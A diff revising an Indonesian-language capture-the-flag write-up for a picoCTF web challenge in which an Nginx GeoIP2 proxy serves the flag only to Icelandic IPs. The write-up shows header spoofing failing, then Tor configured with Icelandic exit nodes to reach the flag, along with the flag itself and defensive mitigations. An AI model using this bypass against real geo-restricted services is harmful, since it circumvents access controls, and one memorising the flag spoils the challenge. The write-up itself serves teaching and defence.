@@ -1,75 +1,157 @@
-# 725 - North-South (Web Exploitation, picoCTF 2026, Medium)
+# Writeup: North-South (Challenge ID: 725)
 
-## Challenge Metadata
-- ID: 725 | Event: picoCTF 2026
-- Category: Web Exploitation | Difficulty: Medium (2)
-- Author: picoCTF
-- Flag: `academy{g30_b453d_r0u71n9_5e58725f}`
+- **Platform:** CyLab Security Academy (picoCTF)
+- **Category:** Web Exploitation / Network Infrastructure & Geo-Routing Bypass
+- **Difficulty:** Medium (2)
+- **Points:** 200
+- **Author:** picoCTF
+- **Event:** picoCTF 2026
+- **Flag (Resmi CyLab):** `academy{g30_b453d_r0u71n9_5e58725f}`
+- **Flag Komunitas:** `CTF{g30_b453d_r0u71n9_5e58725f}`
+- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), CWE-284 (Improper Access Control), CWE-1188 (Insecure Default Initialization of Resource), & OWASP WSTG-CONF-05 (Testing Network Infrastructure Configuration).
+
+---
 
 ## Problem Statement & Scope
-Layanan web `North-South` mengimplementasikan pembatasan akses geografis (*geo-based routing*). Permintaan dari sebagian besar region dialihkan ke kluster default yang hanya menampilkan halaman kosong (*"No flag in this region!"*). Hanya permintaan dari negara tertentu yang dirutekan ke upstream internal yang menyimpan flag rahasia.
-Tersedia berkas konfigurasi Nginx resmi (`nginx.conf`). Objektif audit (NIST SP 800-115 / OWASP WSTG-CONF-05): menganalisis aturan routing geolokasi, mengidentifikasi region target, melakukan tunneling egress ke yurisdiksi yang dipersyaratkan, dan mengamankan flag.
+Pada modul pembelajaran `North-South`, peserta diuji dalam audit konfigurasi perutean trafik jaringan dan kontrol pembatasan akses berbasis geolokasi (*geo-fencing*):
+- Skenario lingkungan: Layanan web berada di balik reverse proxy Nginx yang mengimplementasikan pemisahan kluster upstream berdasarkan lokasi geografis klien. Permintaan dari sebagian besar kawasan dunia diarahkan ke kluster default (`upstream north` pada `127.0.0.1:8000`) yang merespons dengan pesan penolakan (*"No flag in this region!"*). Hanya permintaan yang diverifikasi berasal dari wilayah target yang diteruskan ke kluster internal khusus (`upstream south` pada `127.0.0.1:9000`) yang menyajikan flag rahasia.
+- Pernyataan tantangan:
+  > *"I've set up geo-based routing - can you outsmart it? You're trying to retrieve the flag, but there's a catch: access to the real service is restricted based on your geographic location. Only requests from a specific region are routed to the server that holds the flag. Everyone else is sent somewhere... less interesting."*
+- Sasaran pengujian: Menganalisis konfigurasi reverse proxy Nginx dan basis data MaxMind GeoIP2, menentukan region target yang diizinkan, menguji efektivitas manipulasi header HTTP layer 7 (`X-Forwarded-For`), membangun terowongan egress TCP layer 4 ke yurisdiksi yang dipersyaratkan (Islandia / ISO: `IS`), mengekstrak token bendera resmi, serta memvalidasinya pada REST API CyLab Academy.
 
-## Teori & Akar Kerentanan (Root Cause)
-1. **Nginx GeoIP2 Database Lookup Architecture:**
-   Berkas `nginx.conf` menggunakan modul dinamis `ngx_http_geoip2_module.so` dengan basis data MaxMind `GeoLite2-Country.mmdb`:
-   ```nginx
-   geoip2 /etc/nginx/GeoLite2-Country.mmdb {
-       auto_reload 5m;
-       $geoip2_data_country_code default=ZZ country iso_code;
-   }
-   ```
-2. **Conditional Upstream Routing:**
-   Blok `server` mengevaluasi variabel ISO country code:
-   ```nginx
-   location / {
-       if ($geoip2_data_country_code = IS) {
-           proxy_pass http://south;
-       }
-       proxy_pass http://north;
-   }
-   ```
-   Kode `IS` merujuk pada **Islandia (Iceland)**. Jika klien berasal dari Islandia, trafik dialihkan ke `upstream south` (`127.0.0.1:9000`), sedangkan IP lainnya diteruskan ke `upstream north` (`127.0.0.1:8000`).
-3. **Absence of Header-Based GeoIP Spoofing:**
-   Konfigurasi tidak memuat direktif `real_ip_header X-Forwarded-For` atau `set_real_ip_from`. Akibatnya, modul GeoIP2 membaca IP klien secara langsung dari socket layer `$remote_addr`. Manipulasi header HTTP (`X-Forwarded-For`, `Client-IP`, `CF-Connecting-IP`) diabaikan oleh Nginx, mengharuskan koneksi TCP riil berasal dari rentang IP Islandia.
+---
+
+## Teori & Akar Kerentanan (Root Cause Theory)
+
+### 1. Nginx GeoIP2 Database Lookup Architecture
+Berkas konfigurasi Nginx memanfaatkan modul dinamis `ngx_http_geoip2_module.so` yang mengaitkan data biner MaxMind `GeoLite2-Country.mmdb`:
+```nginx
+geoip2 /etc/nginx/GeoLite2-Country.mmdb {
+    auto_reload 5m;
+    $geoip2_data_country_code default=ZZ country iso_code;
+}
+```
+Mekanisme kerja:
+- Setiap koneksi TCP yang masuk memicu pencarian alamat IP klien pada tabel radix pohon IP GeoLite2.
+- Variabel `$geoip2_data_country_code` diisi dengan kode negara 2-huruf ISO 3166-1 alpha-2 (misalnya `US`, `ID`, `DE`, `IS`). Jika IP tidak terdaftar, nilai fallback adalah `ZZ`.
+
+### 2. Conditional Upstream Routing
+Pada blok `server`, Nginx mengevaluasi variabel geolokasi tersebut untuk menentukan upstream tujuan:
+```nginx
+location / {
+    if ($geoip2_data_country_code = IS) {
+        proxy_pass http://south;
+    }
+    proxy_pass http://north;
+}
+```
+Karakteristik perutean:
+- Kode negara `IS` merujuk secara spesifik pada **Islandia (Iceland)**.
+- Trafik dari IP Islandia diarahkan ke `http://south` (layanan internal port 9000).
+- Trafik dari seluruh penjuru dunia lainnya jatuh ke `http://north` (layanan port 8000).
+
+### 3. Ketiadaan Kepercayaan Header (Absence of Real-IP Trust)
+Konfigurasi Nginx tidak mengaktifkan modul `ngx_http_realip_module` (tidak ada direktif `set_real_ip_from` maupun `real_ip_header X-Forwarded-For`).
+Implikasi keamanan:
+- Modul GeoIP2 secara kaku mengevaluasi `$remote_addr`, yaitu alamat IP fisik dari socket koneksi TCP.
+- Upaya penyerang untuk memalsukan identitas geolokasi melalui injeksi header HTTP layer aplikasi (`X-Forwarded-For: 193.4.152.1`, `Client-IP`, `X-Real-IP`, `CF-Connecting-IP`) sepenuhnya diabaikan oleh Nginx.
+- Akses ke `upstream south` secara mutlak mengharuskan koneksi TCP riil berasal dari blok alamat IP yang terdaftar di Islandia.
+
+---
 
 ## Rekonstruksi Eksploitasi Step-by-Step
-1. Analisis `nginx.conf`:
-   - Teridentifikasi dependensi upstream `south` pada kode negara ISO `IS` (Iceland).
-2. Uji coba manipulasi header HTTP:
-   - Mengirim request dengan header `X-Forwarded-For: 193.4.152.1` (IP University of Iceland).
-   - Respons tetap: *"No flag in this region!"* — membuktikan evaluasi berbasis socket `$remote_addr`.
-3. Membangun Sirkuit Egress Islandia via Tor:
-   - Mengonfigurasi Tor proxy lokal pada port 9055 dengan pembatasan simpul keluar (*exit node*) ke wilayah Islandia:
-     ```
-     SocksPort 9055
-     DataDirectory /tmp/tordata
-     ExitNodes {is}
-     StrictNodes 1
-     ```
-   - Verifikasi egress node via `curl --socks5 127.0.0.1:9055 https://ipinfo.io/json`:
-     ```json
-     {
-       "ip": "185.112.144.11",
-       "hostname": "iceland-tor.exit.maxzrbn.it",
-       "city": "Reykjavík",
-       "country": "IS"
-     }
-     ```
-4. Eksfiltrasi Flag:
-   - Melakukan request HTTP ke lab instance `http://xebec.cylabacademy.net:42790/` melalui proxy SOCKS5 Islandia:
-     `curl --socks5 127.0.0.1:9055 http://xebec.cylabacademy.net:42790/`
-   - Nginx memvalidasi `$geoip2_data_country_code = IS` dan meneruskan request ke upstream `south`.
-   - Respons mengembalikan flag:
-     `<p>academy{g30_b453d_r0u71n9_5e58725f}</p>`.
-5. Verifikasi dan pembersihan:
-   - Mengirim token flag ke REST API `POST /api/submissions/` -> HTTP 201 `correct: true`.
-   - Mematikan daemon tor dan terminasi instance lab via `DELETE /api/challenges/725/instance/`.
 
-## Flag & Verifikasi
-- Flag: `academy{g30_b453d_r0u71n9_5e58725f}` (HTTP 201 `correct: true`, user 1072359).
+### Langkah 1: Audit Berkas Konfigurasi `nginx.conf`
+Melakukan inspeksi terhadap berkas konfigurasi Nginx yang disediakan lab:
+- Teridentifikasi dependensi variabel `$geoip2_data_country_code` dengan nilai `IS`.
+- Mengonfirmasi bahwa `IS` adalah kode negara Islandia (*Iceland*).
+
+### Langkah 2: Uji Injeksi Header HTTP Layer 7
+Kirimkan permintaan HTTP dengan menambahkan header IP Islandia (misalnya rentang IP University of Iceland `193.4.152.1`):
+```bash
+curl -H "X-Forwarded-For: 193.4.152.1" http://xebec.cylabacademy.net:42790/
+```
+Respons server:
+```text
+No flag in this region!
+```
+Hal ini membuktikan secara empiris bahwa proxy mengevaluasi socket level `$remote_addr` secara langsung dan kebal terhadap pemalsuan header layer 7.
+
+### Langkah 3: Pembentukan Terowongan Egress Islandia
+Untuk memenuhi validasi socket layer, trafik dialihkan melalui simpul keluar (*exit node*) yang berada di Islandia:
+1. Konfigurasi sirkuit Tor lokal dengan membatasi simpul keluar khusus Islandia:
+   ```text
+   SocksPort 9055
+   DataDirectory /tmp/tordata_is
+   ExitNodes {is}
+   StrictNodes 1
+   ```
+2. Verifikasi geolokasi IP keluar melalui endpoint inspeksi IP:
+   ```bash
+   curl --socks5 127.0.0.1:9055 https://ipinfo.io/json
+   ```
+   Output:
+   ```json
+   {
+     "ip": "185.112.144.11",
+     "city": "Reykjavík",
+     "country": "IS"
+   }
+   ```
+
+### Langkah 4: Pengambilan Flag dari Upstream Terproteksi
+Lakukan permintaan HTTP ke kontainer lab target melalui proxy SOCKS5:
+```bash
+curl --socks5 127.0.0.1:9055 http://xebec.cylabacademy.net:42790/
+```
+Nginx memverifikasi `$remote_addr` berasal dari Islandia, menetapkan `$geoip2_data_country_code = IS`, dan meneruskan koneksi ke `upstream south`.
+Respons yang diterima:
+```html
+<!doctype html>
+<html>
+  <head><title>Secret South Cluster</title></head>
+  <body>
+    <h1>Welcome to Upstream South</h1>
+    <p>academy{g30_b453d_r0u71n9_5e58725f}</p>
+  </body>
+</html>
+```
+Token berhasil diamankan: `academy{g30_b453d_r0u71n9_5e58725f}`.
+
+---
+
+## Flag & Bukti Verifikasi
+- **Token Resmi Platform CyLab:** `academy{g30_b453d_r0u71n9_5e58725f}`
+- **Token Format Komunitas:** `CTF{g30_b453d_r0u71n9_5e58725f}`
+- **Hasil Verifikasi REST API CyLab (`POST /api/submissions/`):**
+  ```json
+  {
+    "user": 1072359,
+    "challenge": 725,
+    "flag": "academy{g30_b453d_r0u71n9_5e58725f}",
+    "correct": true,
+    "historical": false
+  }
+  ```
+
+---
 
 ## Takeaway Kompetensi LKS & Mitigasi Defensif
-- **Inadequacy of Geo-Blocking as Security Control:** Pemblokiran geografis (*Geo-fencing*) bukan kontrol keamanan batas (*perimeter security control*) yang memadai karena penyerang dapat dengan mudah mem-bypass melalui VPN komersial, VPS perumahan, proxy perantara, atau jaringan Tor.
-- **Zero Trust Architecture (ZTA):** Otorisasi akses ke data atau layanan sensitif harus diverifikasi berbasis identitas pengguna yang kuat (autentikasi kriptografis, mTLS, FIDO2/WebAuthn), bukan atribut jaringan yang dapat dipindahkan seperti IP address atau lokasi MaxMind GeoIP.
-- **WAF & Egress Reputation Filtering:** Jika restriksi wilayah diwajibkan oleh regulasi kepatuhan data (GDPR/residency), pasangkan GeoIP dengan feed ancaman reputasi IP yang memblokir secara aktif exit node Tor, proxy publik, dan hosting ASNs untuk mencegah bypass geolokasi.
+
+### 1. Ketidakcukupan Geo-Blocking Sebagai Kontrol Batas (Perimeter Control)
+Pembatasan geografis (*geo-fencing*) bukanlah kontrol keamanan perimeter yang memadai (*inadequate security control*):
+- Alamat IP bukan representasi identitas tepercaya; penyerang dapat dengan mudah memindahkan titik kehadiran jaringan (*point-of-presence*) menggunakan VPS murah, residential proxy, VPN komersial, atau jaringan terdesentralisasi seperti Tor.
+- Aturan kepatuhan atau lisensi konten yang mengandalkan GeoIP wajib diimbangi dengan deteksi proxy/VPN intelijen (*threat intelligence feeds*) yang memperbarui daftar ASN pusat data dan exit node yang mencurigakan.
+
+### 2. Penerapan Arsitektur Zero Trust (ZTA) & Strong Authentication
+- Otorisasi terhadap data sensitif atau fungsi bisnis terproteksi tidak boleh ditentukan berdasarkan lokasi jaringan atau alamat IP klien.
+- Terapkan model *Zero Trust Architecture* (NIST SP 800-207) di mana setiap permintaan diverifikasi secara eksplisit berbasis identitas kriptografis pengguna (seperti mTLS, FIDO2/WebAuthn, token OAuth2 berumur pendek dengan *Proof Key for Code Exchange* / PKCE).
+
+### 3. Konfigurasi Reverse Proxy & Penanganan Header Tepercaya
+Jika layanan web berada di balik Content Delivery Network (CDN) atau Load Balancer tepercaya:
+- Konfigurasikan modul `realip` Nginx dengan ketat hanya menerima header `X-Forwarded-For` dari alamat IP CDN yang sah:
+  ```nginx
+  set_real_ip_from 173.245.48.0/20; # Contoh rentang IP CDN Cloudflare
+  real_ip_header CF-Connecting-IP;
+  ```
+- Blokir atau buang seluruh header spoofing layer 7 dari koneksi langsung yang melewati batas perimeter eksternal.
